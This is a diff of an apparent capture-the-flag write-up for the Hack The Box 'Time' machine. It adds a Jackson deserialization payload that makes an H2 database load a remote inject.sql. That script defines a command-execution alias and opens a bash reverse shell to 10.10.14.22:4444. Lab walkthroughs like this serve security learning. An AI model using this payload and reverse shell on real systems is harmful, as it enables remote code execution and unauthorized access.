@@ -182,27 +182,29 @@ I still don't understand everything, but it looks like we have to use a part of 
 ```
 "["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url""jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.8:8000/inject.sql'"}]"
 ```
-Note that I removed all the backslashes in the query since they were probably there to escape some characters for the ruby script. I get a "Validation successful!" message when I validate it on the online tool, but nothing happens. Let's use Burp to intercept the request and response. Before sending a request, we check our browser's settings by going to Menu -> Preferences, and we type "Proxy" in the search bar. Then we click on Settings and select Manual proxy configuration. We enter 127.0.0.1 for HTTP Proxy, and set Port to 8080. Finally, we tick "Use this proxy server for all protocols" and we click OK. We can now open Burp.\\
-
-In the tool, we paste the previous command in the text field and click on PROCESS:
+Note that I removed all the backslashes in the query since they were probably there to escape some characters for the ruby script. I get a "Validation successful!" message when I validate it on the online tool, but nothing happens:
 
 <div class="img_container">
 ![test request]({{https://jsom1.github.io/}}/_images/htb_time_tst.png)
 </div>
 
-And we analyze the request on Burp:
+I don't know if it has to fail or not to trigger the vulnerability. We didn't get a reverse shell anyway, so we have to keep trying things.\\
+After several hours of struggling, I asked for help and it turned out I was doing several things wrong... However, I was very close to getting a shell... First, I was using the wrong command in *inject.sql* and this script also contained pasting errors (I had to read it again line by line to figure out what was missing). Instead of using netcat, the command is the following:
+````
+CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
+	String[] command = {"bash", "-c", cmd};
+	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
+	return s.hasNext() ? s.next() : "";  }
+$$;
+CALL SHELLEXEC('setsid bash -i &>/dev/tcp/10.10.14.22/4444 0>&1 &')
+````
+Note that my IP changed since last time! In addition to that, the third line was partially missing and I had to rewrite myself some text. This is really the reason why it wasn't working, because we also catch a shell with the previous netcat command, however it is unstable. Finally, I had to remove the "" in the request submitted to the JSON parser... So, we can start a web server, setup a netcat listener, and enter the following command in the web application:
 
-<div class="img_container">
-![Burp]({{https://jsom1.github.io/}}/_images/htb_time_burp.png)
-</div>
+```
+["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url""jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.22:8000/inject.sql'"}]
+```
 
-Here we see the request and the parameters. We can modify anything we want before forwarding it to the server. Once we're happy with it, we click on forward. We can also analyze the response by right clicking in the Window, selecting Do intercept -> response to this request.\\
-Let's just forward it and see what happens. In this case, the validation is successful. I don't know if it has to fail or not to trigger the vulnerability. We didn't get a reverse shell anyway, so we have to keep trying things.
-To make the process of modifying the request easier, we will send the request to Burp's repeater. We just right click on the request and select Send to Repeater as follows:
 
-<div class="img_container">
-![Burp repeater]({{https://jsom1.github.io/}}/_images/htb_time_repeater.png)
-</div>
 
 TODO : repreenddre 1ere requet qui a crash et add la commande. Need aussi choper Jruby que je sers sur le serv et copier la commande entière '??
 
